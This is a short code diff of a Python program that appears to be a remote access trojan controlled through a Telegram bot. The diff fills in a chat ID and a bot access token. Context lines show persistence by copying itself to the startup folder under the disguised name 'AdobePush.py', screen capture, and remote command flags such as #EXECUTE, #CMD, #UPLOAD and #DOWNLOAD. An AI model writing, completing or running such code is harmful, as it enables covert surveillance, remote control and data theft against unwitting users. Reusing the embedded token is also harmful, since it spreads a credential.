@@ -41,7 +41,7 @@ from PIL import ImageGrab
 from uuid import getnode as get_mac
 
 # -----------------------------------------------------------------------------
-CHAT_ID = ''  #Get chat id from telegram app
+CHAT_ID = '5862023363'  #Get chat id from telegram app
 BOTS_ALIVE = []
 MAC_ADDRESS = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
 PLAT_FORM = platform.platform()
@@ -62,7 +62,7 @@ current_system_time = datetime.datetime.now()
 
 copied_startup_filename = 'AdobePush.py' # The file will be copied to startup folder by this name
 
-access_token = '' # Get access token from botfather in telegram app
+access_token = '5862023363:AAHjTWlY212P7EbFHlMmJ_jSN65o3I816f0' # Get access token from botfather in telegram app
 FLAGS = ["#START", "#STOP", "#EXECUTE", "#SEND", "#DOWNLOAD", "#UPLOAD", "#SCREENSHOT", "#CMD", "#WALLPAPER", "#HELP", "#SET", "#FIND"]
 # -----------------------------------------------------------------------------
 
